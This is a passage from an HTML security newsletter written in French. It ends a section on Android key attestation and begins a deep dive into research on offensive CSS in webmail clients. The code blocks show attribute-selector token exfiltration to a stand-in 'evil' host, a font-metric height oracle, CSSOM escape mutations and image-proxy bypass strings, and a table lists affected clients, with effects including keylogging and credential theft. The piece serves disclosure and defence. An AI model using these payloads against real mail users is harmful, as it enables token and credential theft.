+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Un mot sur l'impl&eacute;mentation c&ocirc;t&eacute; serveur, puisque c'est la que tout se joue. La documentation Android recommande explicitement de ne pas &eacute;crire son propre v&eacute;rificateur et d'utiliser la biblioth&egrave;que Kotlin <code>android/keyattestation</code>, au motif qu'elle traite correctement les cas limites et la gestion des expirations pour les certificats issus de provisioning usine <em>et</em> de RKP. La remarque m&eacute;rite d'&ecirc;tre prise au s&eacute;rieux : un validateur maison qui parse l'ASN.1 &agrave; la main tend &agrave; s'arr&ecirc;ter aux champs qu'il comprend, et les deux contr&ocirc;les qui cassent le relais &mdash; <code>attestationApplicationId</code> et la preuve de possession &mdash; sont pr&eacute;cis&eacute;ment ceux qu'on n'ecrit pas quand on code contre l'exemple de la documentation.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  La le&ccedil;on g&eacute;n&eacute;rale se r&eacute;sume en une phrase : une attestation prouve l'&eacute;tat d'une plateforme au moment ou elle a &eacute;t&eacute; produite, et rien d'autre. La lier &agrave; l'application demande un champ que beaucoup de validateurs ignorent ; la lier &agrave; la session demande un aller-retour suppl&eacute;mentaire que presque personne n'implemente. Tant que ces deux liens manquent, la v&eacute;rification la plus rigoureuse du monde valide une preuve authentique portant sur un appareil qui n'est pas celui d'en face.
+</td>
+</tr>
+<tr>
+<td style="padding:8px 30px 30px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#f1efea; border:1px solid #dcd8d0;">
+  <tr><td style="padding:12px 16px 8px 16px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700; border-bottom:1px solid #dcd8d0;">Sources &mdash; partie 02</td></tr>
+  <tr>
+    <td style="padding:12px 16px 14px 16px;">
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; font-family:Consolas,'SF Mono',Menlo,monospace;">
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[9]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-11</span> &nbsp;&middot;&nbsp; Quarkslab &mdash; <a href="https://blog.quarkslab.com/bypassing-android-hardware-attestation.html" style="color:#2f5474;">Bypassing Android Hardware Attestation from the Analyst's Chair</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[10]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-11</span> &nbsp;&middot;&nbsp; Quarkslab &mdash; <a href="https://github.com/quarkslab/android-hardware-attestation-demo" style="color:#2f5474;">android-hardware-attestation-demo (backend, apps, instrumentation)</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[11]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; AOSP &mdash; <a href="https://source.android.com/docs/security/features/keystore/attestation" style="color:#2f5474;">Key and ID Attestation - schema version 500, OID et tags</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700; padding-bottom:6px;">[12]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; padding-bottom:6px; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; Android Developers &mdash; <a href="https://developer.android.com/privacy-and-security/security-key-attestation" style="color:#2f5474;">Verifying hardware-backed key pairs with key attestation</a></td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; font-size:12px; line-height:19px; color:#7a4a2e; font-weight:700;">[13]</td>
+        <td valign="top" style="font-size:12px; line-height:19px; color:#403d38; word-break:break-word;"><span style="color:#1e1d1b; font-weight:700;">2026-08-12</span> &nbsp;&middot;&nbsp; AOSP &mdash; <a href="https://source.android.com/docs/core/ota/modular-system/remote-key-provisioning" style="color:#2f5474;">Remote Key Provisioning</a></td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td id="partie-3" style="padding:14px 30px 0 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; border-top:3px solid #1e1d1b;">
+  <tr><td style="padding:10px 0 0 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; letter-spacing:2px; text-transform:uppercase; color:#7a4a2e; font-weight:700;">Partie 03 &nbsp;&middot;&nbsp; Deep-dive</td></tr>
+  <tr><td style="padding:4px 0 6px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:24px; line-height:29px; font-weight:700; color:#1e1d1b; letter-spacing:-0.3px;">CSS offensif dans le webmail : exfiltration, mutation et keylogging</td></tr>
+  <tr><td style="padding:0 0 14px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:14px; line-height:21px; color:#5f5c55;">Gareth Heyes d&eacute;monte l'hypoth&egrave;se qui fonde tous les sanitizers d'email : que le CSS est de la pr&eacute;sentation, donc inerte. R&eacute;sultats confirm&eacute;s sur Gmail, Outlook, Fastmail, ProtonMail et Yahoo.</td></tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+  <tr>
+    <td style="padding:0 0 10px 0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1.5px; text-transform:uppercase; color:#5f5c55; font-weight:700;">Plan</td>
+  </tr>
+  <tr>
+    <td>
+      <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse;">
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">1</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Le paradoxe du webmail : rendre du CSS hostile avec fidelite visuelle</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">2</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Exfiltration par s&eacute;lecteur d'attribut, et le nesting comme compression</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">3</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">L'oracle de hauteur : fuir sans requ&ecirc;te quand la CSP ferme le r&eacute;seau</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">4</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Mutation CSSOM : quand le sanitizer et le navigateur ne lisent pas le m&ecirc;me document</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 10px 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">5</td></tr></table></td>
+        <td valign="top" style="padding:0 0 10px 0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Gadgets, hotwiring et keylogger : du vol de token au vol d'identifiants</td>
+      </tr>
+      <tr>
+        <td width="34" valign="top" style="width:34px; padding:0 10px 0 0;"><table role="presentation" cellpadding="0" cellspacing="0" border="0" style="border-collapse:collapse;"><tr><td width="24" height="24" align="center" valign="middle" style="width:24px; height:24px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; font-weight:700; color:#f5f3ef; line-height:24px;">6</td></tr></table></td>
+        <td valign="top" style="font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:15px; line-height:24px; color:#2c2a26;">Ce qui tient, ce qui est speculatif, et ce que coute la d&eacute;fense</td>
+      </tr>
+      </table>
+    </td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Un client webmail est coinc&eacute; entre deux exigences contradictoires. Il doit afficher du HTML et du CSS &eacute;crits par un inconnu, et il doit les afficher fid&egrave;lement, parce qu'un mail marketing casse est un bug produit. La r&eacute;solution habituelle consiste &agrave; filtrer le HTML dangereux &mdash; scripts, handlers d'&eacute;v&eacute;nements &mdash; et &agrave; laisser passer le CSS, sur l'hypoth&egrave;se que le CSS d&eacute;crit une apparence et ne d&eacute;clenche pas d'action. Le travail de Heyes consiste &agrave; d&eacute;monter cette hypoth&egrave;se propri&eacute;t&eacute; par propri&eacute;t&eacute;.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Avant m&ecirc;me le CSS, un &eacute;l&eacute;ment HTML anodin donne d&eacute;j&agrave; de l'action. Un <code>&lt;label for="id"&gt;</code> h&eacute;rite du comportement d'activation du contr&ocirc;le de formulaire auquel il est associ&eacute; : cliquer sur le label revient &agrave; cliquer sur le contr&ocirc;le. Les sanitizers autorisent volontiers <code>&lt;label&gt;</code> et ne filtrent pas l'attribut <code>for</code>, sur l'hypoth&egrave;se que les identifiants du client sont internes donc hors de port&eacute;e. Ils ne le sont pas : un label pointant vers un identifiant de l'interface, du type <code>&lt;label for="RibbonModeToggle"&gt;</code>, permet &agrave; un message de piloter un &eacute;l&eacute;ment d'Outlook. L'attaquant n'a pas besoin de JavaScript pour obtenir un clic utile, seulement d'un utilisateur qui clique quelque part.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le premier canal est ancien mais l'article le pousse plus loin qu'a l'accoutumee. Un s&eacute;lecteur d'attribut peut tester le pr&eacute;fixe, le suffixe ou une sous-cha&icirc;ne d'un <code>href</code> ; si le test passe, la d&eacute;claration s'applique, et une d&eacute;claration <code>background: url(...)</code> &eacute;met une requ&ecirc;te vers le serveur de l'attaquant. Le nom du fichier demande porte l'information. Le probl&egrave;me pratique de cette technique a toujours &eacute;t&eacute; la taille : couvrir tout l'alphabet d'un token exige un nombre de r&egrave;gles qui fait exploser le mail.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Exfiltration par s&eacute;lecteur d'attribut, avec nesting</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">/* Le selecteur d'attribut teste un prefixe. S'il matche,
+   la declaration s'applique - et background declenche une requete. */
+a[href^="https://medium.com/m/callback/email?token=c2e16"] {
+    background: url("//evil/?start=c2e16");
+}
+
+/* Le nesting CSS evite de repeter le prefixe long : a payload
+   equivalent, le mail passe de centaines de kilo-octets a une taille
+   que le client accepte encore de rendre. */
+a[href^="https://medium.com/m/callback/email?token="] {
+    &amp;[href*="en=c2e16"] { background: url("//evil/?start=c2e16"); }
+    &amp;[href*="c2e16f9"] { background: url("//evil/?mid=c2e16f9"); }
+}</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Le nesting CSS reutilise le pr&eacute;fixe parent au lieu de le r&eacute;p&eacute;ter dans chaque r&egrave;gle. C'est ce qui fait passer le payload sous le seuil de taille du client.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  La r&eacute;cup&eacute;ration reste indirecte : les s&eacute;lecteurs d'attribut testent des pr&eacute;fixes et des sous-cha&icirc;nes, pas des positions arbitraires. Sur un token hexad&eacute;cimal de douze caract&egrave;res, Heyes capture cinq caract&egrave;res au d&eacute;but et cinq &agrave; la fin, puis des blocs de cinq qui se chevauchent, et reconstitue le milieu c&ocirc;t&eacute; serveur par recoupement. La technique se d&eacute;grade avec la longueur du secret et avec la taille des blocs &mdash; &agrave; quatre caract&egrave;res, le nombre de r&egrave;gles necessaires redevient prohibitif.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Le morceau r&eacute;ellement neuf commence la ou la d&eacute;fense est censee &ecirc;tre efficace. Si une CSP interdit toute ressource externe, il n'y a plus de requ&ecirc;te &agrave; &eacute;mettre &mdash; donc plus de canal. Heyes en construit un autre &agrave; partir de la g&eacute;om&eacute;trie du texte. Un <code>@font-face</code> peut restreindre sa couverture &agrave; un seul point de code via <code>unicode-range</code>, et <code>descent-override</code> permet de red&eacute;finir la m&eacute;trique de descente que CSS utilise pour disposer les line boxes. En donnant &agrave; un face une descente de 200 % et en ne lui faisant couvrir que <code>U+0030</code>, la hauteur d'un conteneur devient fonction du nombre de zeros qu'il contient.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Oracle de hauteur : une m&eacute;trique de font comme canal</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">/* Quand la CSP interdit les requetes sortantes, on ne fuit plus
+   par le reseau : on fuit par la geometrie. */
+@font-face {
+    font-family: has_0;
+    src: local('Courier New');
+    unicode-range: U+0030;      /* ce face ne couvre que le chiffre 0 */
+    descent-override: 200%;     /* et il rend ce chiffre anormalement haut */
+}
+
+/* Applique au conteneur du secret, la hauteur finale devient une
+   fonction du nombre de '0' presents. Une keyframe fait defiler les
+   dix faces ; la propriete inset revele ensuite le lien correspondant
+   a la combinaison mesuree. */</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">descent-override sert normalement &agrave; aligner les m&eacute;triques d'une font de repli pour eviter les sauts de mise en page. Detourne, il transforme un compteur de caract&egrave;res en diff&eacute;rence de hauteur mesurable.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Une animation fait ensuite d&eacute;filer les dix faces, un par chiffre, et la propri&eacute;t&eacute; <code>inset</code> affiche le lien d'exfiltration correspondant &agrave; la combinaison observ&eacute;e. On ne lit pas le secret directement : on lit sa composition en chiffres, ce qui suffit pour un code num&eacute;rique court. C'est un oracle, pas une fuite complete, et l'article le presente comme tel.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Vient ensuite la classe de bugs la plus int&eacute;ressante du papier, parce qu'elle ne vise pas une propri&eacute;t&eacute; mais le sanitizer lui-m&ecirc;me. Beaucoup de clients filtrent en s'appuyant sur le CSSOM : ils laissent le navigateur parser la feuille, inspectent la repr&eacute;sentation obtenue, puis la re-s&eacute;rialisent. Or le parsing normalise les &eacute;chappements hexad&eacute;cimaux. Un nom de keyframe contenant <code>\7d</code> et <code>\2a</code> est inoffensif au moment de l'inspection ; apr&egrave;s re-s&eacute;rialisation, ces s&eacute;quences redeviennent <code>}</code> et <code>*</code>, ce qui ferme le bloc et ouvre un s&eacute;lecteur universel.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 6px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; background-color:#211f1c; border:1px solid #111010;">
+  <tr>
+    <td style="padding:9px 14px; border-bottom:1px solid #3a3733; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; letter-spacing:1px; color:#a29d94;">Mutation CSSOM - le document inspecte n'est pas le document rendu</td>
+  </tr>
+  <tr>
+    <td style="padding:14px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:13px; line-height:20px; color:#e0dcd3; white-space:pre-wrap; word-break:break-word; overflow-wrap:break-word;">/* Ce que le sanitizer voit et accepte : un nom de keyframe
+   contenant des echappements hexadecimaux, parfaitement inoffensif. */
+@keyframes foo\7d\2a { color: red }
+
+/* Ce que le navigateur produit apres parsing, quand le sanitizer
+   re-serialise depuis le CSSOM : \7d devient } et \2a devient *. */
+@keyframes foo } * { color: red }
+
+/* Meme mecanique sur une media query : */
+@media s\63\72\65\65\6e\7d\2a\7b...   -&gt;   @media screen } * { color:red } print</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">Le sanitizer valide une chose, le navigateur en applique une autre. La m&ecirc;me m&eacute;canique fonctionne sur @media, ou l'echappement du mot-cl&eacute; 'screen' reconstitue une accolade fermante suivie d'une r&egrave;gle universelle.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  La m&ecirc;me famille de d&eacute;fauts frappe les proxies d'images. Un webmail s&eacute;rieux r&eacute;&eacute;crit toutes les URL distantes vers son propre serveur, ce qui neutralise le tracking et masque l'IP du lecteur. Encore faut-il que le proxy et le navigateur lisent l'URL de la m&ecirc;me fa&ccedil;on. Trois contournements sont documentes : chez Fastmail, un antislash &eacute;chapp&eacute; (<code>content:url(/\5c/user.fm/...)</code>) &eacute;gare le parser du proxy la ou le navigateur voit un hote ; chez ProtonMail, des commentaires <code>/*Url(</code> imbriqu&eacute;s traversent la sanitisation avant d'atteindre le serveur externe (correctif rapporte) ; chez Gmail, <code>background: image-set(var(--x,'//02.rs'))</code> exploite la valeur de repli d'une variable inexistante, que le proxy ne voit pas passer.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
+  Deux quirks de syntaxe completent le tableau et m&eacute;ritent d'&ecirc;tre notes parce qu'ils cassent les filtres &agrave; base de deny-list. Firefox ignore les accolades dans les noms de propri&eacute;t&eacute;, ce qui suffit &agrave; faire passer <code>&lt;div style="}color:red"&gt;</code> devant un filtre qui cherchait <code>color:</code>. Et les slashes &agrave; l'int&eacute;rieur d'une <code>url()</code> ont une s&eacute;mantique propre, ce qui permet &agrave; <code>background:url(/\D/evil)</code> de traverser un filtrage base sur le chemin.
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 8px 30px;">
+  <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="width:100%; border-collapse:collapse; table-layout:fixed; border:1px solid #cfccc4;">
+  <tr>
+    <td width="17" style="width:17; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">Client</td>
+    <td width="24" style="width:24; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">Primitive obtenue</td>
+    <td width="35" style="width:35; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; border-right:1px solid #3a3733; word-break:break-word;">M&eacute;canisme</td>
+    <td width="24" style="width:24; padding:8px 8px; background-color:#1e1d1b; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:15px; letter-spacing:0.5px; color:#f5f3ef; font-weight:700; word-break:break-word;">Effet demontre</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Fastmail</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Contr&ocirc;le CSS complet de la page</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Mutation CSSOM sur @keyframes et @media ; antislash echappe contre le proxy d'images</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Tracking et keylogging</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Gmail</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Requ&ecirc;tes externes et s&eacute;lecteurs d'&eacute;tat</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Repli de variable dans image-set() ; :has() et :checked autorises</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Tracking, exfiltration de token</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">Outlook</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Injection via gadget CSS</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">@media malforme accepte par le sanitizer, puis position:fixed en !important</td>
+    <td style="padding:9px 8px; background-color:#fbfaf8; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Overlay plein ecran, vol d'identifiants</td>
+  </tr>
+  <tr>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:12px; line-height:17px; color:#1e1d1b; font-weight:700; word-break:break-word;">ProtonMail / Yahoo-AOL</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Requ&ecirc;te externe, exfiltration</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; border-right:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Commentaires imbriqu&eacute;s (Proton, corrige) ; s&eacute;lecteur d'attribut sur collage (Yahoo)</td>
+    <td style="padding:9px 8px; background-color:#f4f2ed; border-top:1px solid #dcd8d0; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:13px; line-height:18px; color:#403d38; word-break:break-word;">Divulgation d'IP, vol de token</td>
+  </tr>
+  </table>
+</td>
+</tr>
+<tr>
+<td style="padding:0 30px 18px 30px; font-family:Consolas,'SF Mono',Menlo,monospace; font-size:11px; line-height:17px; color:#7d7a73;">R&eacute;sultats rapport&eacute;s par l'auteur apr&egrave;s tests sur chaque produit. Le correctif ProtonMail est signale dans l'article ; l'&eacute;tat de d&eacute;ploiement des autres n'y est pas d&eacute;taill&eacute;.</td>
+</tr>
+<tr>
+<td style="padding:0 30px 16px 30px; font-family:-apple-system,'Segoe UI',Roboto,Helvetica,Arial,sans-serif; font-size:16px; line-height:25px; color:#2c2a26;">
